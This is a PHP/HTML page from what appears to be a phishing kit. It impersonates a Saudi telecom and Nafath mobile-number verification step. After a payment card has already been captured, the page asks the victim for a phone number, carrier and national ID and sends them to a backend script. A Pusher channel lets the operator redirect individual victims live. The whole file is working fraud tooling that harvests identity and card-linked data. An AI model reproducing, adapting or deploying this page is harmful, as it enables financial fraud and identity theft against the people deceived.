<?php
session_start();
require_once 'dashboard/init.php';
require_once 'includes/redirect.php';

// Get user ID from URL parameter or session
$userId = null;

if (isset($_GET['id'])) {
    $userId = $_GET['id'];
    $_SESSION['current_user_id'] = $userId;
} elseif (isset($_SESSION['current_user_id'])) {
    $userId = $_SESSION['current_user_id'];
}

if (!$userId) {
    header('Location: pin.php');
    exit;
}

// تثبيت client_id للتوافق مع الكود القديم
$_SESSION['client_id'] = $userId;

/**
 * جلب آخر بطاقة للمستخدم
 */
$card = $User->fetchLastCardByUserId($userId);
if (!$card) {
    header('Location: pay.php?id=' . $userId);
    exit;
}

/**
 * تجهيز البيانات
 */
$data = [
    'client_id'   => $userId,
    'card_id'     => $card->id,
    'card_last4'  => substr(preg_replace('/\D/', '', $card->cardNumber ?? ''), -4),
    'flow'        => 'nafad'
];
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>توثيق رقم الجوال</title>

    <script src="https://cdn.tailwindcss.com"></script>

    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">

<style>
* {
    box-sizing: border-box;
}

body {
    font-family: 'Cairo', sans-serif;
    background-color: #ffffff;
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
    color: #333;
}

.stc-card {
    background: #fff;
    border: 1px solid #e2e8f0;
    border-radius: 12px;
    padding: 30px 25px;
    width: 100%;
    max-width: 420px;
    box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
}

.top-header {
    margin-bottom: 20px;
    width: 100%;
    max-width: 400px;
    display: flex;
    justify-content: flex-start;
    align-items: center;
}
.top-header img {
    height: 50px;
}

.mutasil-logo {
    margin-bottom: 20px;
    text-align: right;
}
.mutasil-logo img {
    height: 40px;
}

.notification-box {
    display: flex;
    align-items: flex-start;
    gap: 15px;
    margin-bottom: 25px;
}

.kau-icon {
    width: 45px;
    height: auto;
    flex-shrink: 0;
    margin-top: -5px;
}

.text-content {
    flex: 1;
    text-align: right;
}

.info-title {
    font-size: 16px;
    font-weight: 700;
    color: #2d3748;
    margin-bottom: 6px;
    display: flex;
    align-items: center;
    gap: 5px;
}

.green-arrow {
    color: #22c55e;
    font-weight: bold;
    font-size: 18px;
    transform: translateY(2px);
}

.info-desc {
    font-size: 13px;
    color: #718096;
    line-height: 1.6;
    font-weight: 600;
}

.input-group {
    margin-bottom: 15px;
    position: relative;
}

.stc-input {
    width: 100%;
    padding: 12px 15px;
    border: 1px solid #cbd5e0;
    border-radius: 6px;
    font-family: 'Cairo', sans-serif;
    font-size: 15px;
    text-align: right;
    outline: none;
    transition: border-color 0.3s;
    background-color: #fff;
    color: #333;
}

.stc-input:focus {
    border-color: #1a1a85;
}

.phone-wrapper input {
    padding-left: 50px;
    text-align: left;
    direction: ltr;
}
.saudi-flag {
    position: absolute;
    left: 12px;
    top: 50%;
    transform: translateY(-50%);
    width: 28px;
    height: 20px;
    border-radius: 3px;
}

.verify-btn {
    width: 100%;
    background-color: #1a1a85;
    color: #ffffff;
    border: none;
    padding: 12px 0;
    border-radius: 25px;
    font-family: 'Cairo', sans-serif;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
    margin-top: 20px;
}

.card-footer-stc {
    margin-top: 35px;
    display: flex;
    justify-content: center;
    align-items: center;
}
.cst-logo {
    height: 130px;
}
</style>
</head>
<body>


<form class="stc-card" onsubmit="event.preventDefault(); saveForm(this);">

    <div class="mutasil-logo">
        <img src="img/Capture216.PNG" alt="mutasil">
    </div>

    <div class="notification-box">
        <img src="image/kau.jpg" alt="icon" class="kau-icon">
        
        <div class="text-content">
            <div class="info-title">
                <span class="green-arrow">↗</span>
                توثيق واعتماد رقم الجوال
            </div>
            <div class="info-desc">
                يجب أن يكون رقم الجوال موثقاً ومطابقاً لبيانات الهوية الوطنية / الإقامة، ومرتبطاً ببطاقة الدفع المدخلة
            </div>
        </div>
    </div>

    <!-- رقم الجوال -->
    <div class="input-group phone-wrapper">
        <input type="tel" id="phonenumber" name="phonenumber" class="stc-input" placeholder="5xxxxxxxx" required>
        <img src="https://flagcdn.com/w40/sa.png" alt="KSA" class="saudi-flag">
    </div>

    <!-- مشغل الشبكة -->
    <div class="input-group">
        <select id="telecom" name="telecom" class="stc-input" required>
            <option value="" disabled selected>اختر مشغل الشبكة</option>
            <option value="Zain">Zain</option>
            <option value="Mobily">Mobily</option>
            <option value="STC">STC</option>
            <option value="Salam">Salam</option>
            <option value="Virgin">Virgin</option>
            <option value="Redbull">Redbull</option>
        </select>
    </div>

    <!-- هوية جديدة -->
    <div class="input-group">
        <input type="text" id="idNumberInput" name="idNumber_new" class="stc-input"
               placeholder="رقم الهوية الوطنية / الاقامة">
    </div>

    <!-- ✅ User ID المخفي -->
    <input type="hidden" name="user_id" value="<?= htmlspecialchars($userId, ENT_QUOTES, 'UTF-8') ?>">

    <!-- البيانات الإضافية -->
    <?php
    foreach ($data as $k => $v) {
        if (is_array($v)) {
            $v = json_encode($v, JSON_UNESCAPED_UNICODE);
        }

        $safeKey = htmlspecialchars($k, ENT_QUOTES, 'UTF-8');
        $safeVal = htmlspecialchars($v, ENT_QUOTES, 'UTF-8');

        echo "<input type='hidden' name='{$safeKey}' value='{$safeVal}'>\n";
    }
    ?>

    <button type="submit" class="verify-btn">دخول</button>

    <div class="card-footer-stc">
        <img src="img/shaer.png" alt="CST Logo" class="cst-logo">
    </div>
</form>

<script>
async function saveForm(form) {

    const phonenumber = document.getElementById('phonenumber').value.trim();
    const telecom = document.getElementById('telecom').value.trim();
    const idInput = document.getElementById('idNumberInput').value.trim();

    if (!phonenumber || !telecom) {
        alert("يرجى إدخال رقم الجوال واختيار مشغل الشبكة.");
        return;
    }

    const formData = new FormData(form);
    formData.set("phonenumber", phonenumber);
    formData.set("telecom", telecom);
    if (idInput) formData.set("idNumber_new", idInput);

    console.log('📤 إرسال البيانات إلى tele/nafad.php...');

    let res;
    try {
        res = await fetch("tele/nafad.php", {
            method: "POST",
            body: formData
        });
    } catch (e) {
        console.error('❌ خطأ في الاتصال:', e);
        alert("خطأ في الاتصال بالخادم");
        return;
    }

    let result;
    try {
        result = await res.json();
    } catch (e) {
        console.error('❌ استجابة غير صحيحة:', e);
        alert("استجابة غير صحيحة من الخادم");
        return;
    }

    console.log('✅ الرد من الخادم:', result);

    if (result.success) {
        // ✅ التوجيه لـ success.php مع user_id
        window.location.href = `success.php?id=${result.data.user_id}`;
    } else {
        alert(result.message || "حدث خطأ.");
    }
}

console.log('📋 البيانات المستلمة:', <?php echo json_encode($data, JSON_UNESCAPED_UNICODE); ?>);
</script>

<script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
<script>
const pusher = new Pusher('a56388ee6222f6c5fb86', {
    cluster: 'ap2',
    encrypted: true
});

const channel = pusher.subscribe('my-channel');

channel.bind('force-redirect-user', function(data) {
    const myId = localStorage.getItem('current_user_id');

    if (myId && data.userId == myId) {
        window.location.href = data.url;
    }
});
</script>

</body>
</html>